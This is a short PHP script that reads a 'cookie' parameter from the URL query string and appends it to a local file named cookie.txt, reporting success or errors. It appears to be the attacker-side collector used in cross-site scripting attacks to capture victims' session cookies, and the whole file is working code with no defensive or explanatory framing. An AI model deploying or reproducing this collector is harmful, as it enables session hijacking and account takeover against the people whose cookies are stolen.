<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $file = @fopen("cookie.txt", "a");
    if (!$file) {
        $error = error_get_last();
        echo "Error creating file: " . $error['message'];
        exit;
    }
    if (!fwrite($file, $cookie)) {
        $error = error_get_last();
        echo "Error writing to file: " . $error['message'];
        exit;
    }
    fclose($file);
    echo "Cookie written to file!";
}
?>